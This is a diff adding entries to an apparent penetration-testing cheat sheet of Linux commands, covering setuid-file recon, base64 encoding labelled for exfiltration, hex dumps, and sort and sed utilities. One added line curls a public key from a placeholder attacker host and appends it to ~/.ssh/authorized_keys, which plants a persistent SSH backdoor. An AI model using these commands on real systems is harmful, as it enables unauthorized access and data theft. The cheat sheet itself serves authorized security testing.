@@ -77,5 +77,30 @@ scp /path/to/local/file username@target-server-ip:/path/to/destination
 # Finds files with the setuid bit set in the entire filesystem, suppresses any error messages, and then lists detailed information about these files.
 find / -perm -4000 2> /dev/null | xargs ls -lah
 
+# Exfiltrating using base64 
+base64 -w 0 file
+
+# Get HexDump without new lines
+xxd -p boot12.bin | tr -d '\n'
+
+# Add public key authorized keys file
+curl https://ATTACKER-IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+#Sort
+sort -nr #Sort by number and then reverse
+cat file | sort | uniq #Sort and delete duplicates
+
+#Replace in file
+sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
+
+
+
+
+
+
+
+
+
+
 
 
